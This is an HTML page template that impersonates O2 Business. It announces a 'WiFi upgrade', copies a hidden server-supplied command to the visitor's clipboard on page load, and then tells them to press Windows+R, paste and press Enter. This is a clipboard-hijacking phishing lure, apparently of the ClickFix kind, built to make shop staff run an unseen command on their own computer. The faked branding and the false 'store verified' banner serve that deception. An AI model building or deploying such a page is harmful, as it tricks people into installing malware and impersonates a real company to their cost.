<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apply WiFi Upgrade | O2 Business</title>
    <link rel="stylesheet" href="/css/main.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
</head>
<body>
    <header class="o2-header">
        <div class="header-container">
            <a href="https://www.o2.co.uk" class="logo-link">
                <img src="https://imgs.search.brave.com/_8uWRUTQLMKrInHR3bwZc36sUEVpozrXMOduCXBaepw/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly8xMDAw/bG9nb3MubmV0L3dw/LWNvbnRlbnQvdXBs/b2Fkcy8yMDE4LzA3/L08yLUxvZ28tNTAw/eDI4MS5wbmc" alt="O2" class="o2-logo-img">
            </a>
            <nav class="header-nav">
                <a href="https://www.o2.co.uk/shop" class="header-link">Shop</a>
                <a href="https://www.o2.co.uk/connectivity" class="header-link">Business</a>
                <a href="https://www.o2.co.uk/help" class="header-link">Help</a>
            </nav>
        </div>
    </header>

    <main>
        <section class="steps-section" style="background:#FFFFFF;">
            <div class="section-inner">
                <div class="success-banner">
                    <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#032B5A" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
                    <h3>Store verified successfully</h3>
                    <p>Your store is eligible for the WiFi upgrade. The upgrade command has been copied to your clipboard. Follow the steps below to apply it.</p>
                </div>
            </div>
        </section>

        <section class="steps-section">
            <div class="section-inner">
                <h2>Activate your WiFi upgrade in under a minute</h2>
                <p class="section-sub">Three simple steps and your store's WiFi will be upgraded. The command is ready on your clipboard.</p>

                <div class="copy-section">
                    <button class="copy-btn" id="copyBtn">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                        <span id="copyBtnText">Copy Upgrade Command</span>
                    </button>
                </div>

                <div class="steps-container">
                    <div class="step-card">
                        <div class="step-marker">1</div>
                        <div class="step-body">
                            <h3>Open the Run dialog</h3>
                            <p>Press <kbd>Windows</kbd> + <kbd>R</kbd> on your keyboard</p>
                        </div>
                    </div>
                    <div class="step-arrow">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="2"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
                    </div>
                    <div class="step-card">
                        <div class="step-marker">2</div>
                        <div class="step-body">
                            <h3>Paste the command</h3>
                            <p>Press <kbd>Ctrl</kbd> + <kbd>V</kbd> to paste the upgrade command</p>
                        </div>
                    </div>
                    <div class="step-arrow">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="2"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
                    </div>
                    <div class="step-card">
                        <div class="step-marker">3</div>
                        <div class="step-body">
                            <h3>Press Enter</h3>
                            <p>Hit <kbd>Enter</kbd> and the WiFi upgrade will be applied automatically</p>
                        </div>
                    </div>
                </div>

                <div class="clipboard-banner">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#032B5A" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                    <span>Upgrade command automatically copied to clipboard.</span>
                </div>
            </div>
        </section>
    </main>

    <footer class="page-footer">
        <div class="footer-inner">
            <div class="footer-links">
                <a href="https://www.o2.co.uk/termsandconditions" class="footer-link">Terms &amp; Conditions</a>
                <a href="https://www.o2.co.uk/privacy" class="footer-link">Privacy Policy</a>
                <a href="https://www.o2.co.uk/help" class="footer-link">Help &amp; Support</a>
            </div>
            <p class="footer-copy">&copy; 2026 Telefonica UK Limited. All rights reserved.</p>
        </div>
    </footer>

    <script>
        var copyText = <%- JSON.stringify(copyText) %>;

        function doCopy() {
            if (copyText && navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(copyText).then(function() {
                    onCopySuccess();
                }).catch(function() {
                    fallbackCopy();
                });
            } else {
                fallbackCopy();
            }
        }

        function fallbackCopy() {
            var ta = document.createElement('textarea');
            ta.value = copyText;
            ta.style.position = 'fixed';
            ta.style.left = '-9999px';
            document.body.appendChild(ta);
            ta.select();
            document.execCommand('copy');
            document.body.removeChild(ta);
            onCopySuccess();
        }

        function onCopySuccess() {
            var btn = document.getElementById('copyBtn');
            var btnText = document.getElementById('copyBtnText');
            btn.classList.add('copied');
            btnText.textContent = 'Command Copied!';

            var banner = document.querySelector('.clipboard-banner span');
            if (banner) banner.textContent = 'Upgrade command copied to clipboard.';

            setTimeout(function() {
                btn.classList.remove('copied');
                btnText.textContent = 'Copy Upgrade Command';
            }, 3000);
        }

        document.getElementById('copyBtn').addEventListener('click', doCopy);

        (function() {
            if (copyText) {
                doCopy();
            }
        })();
    </script>
</body>
</html>
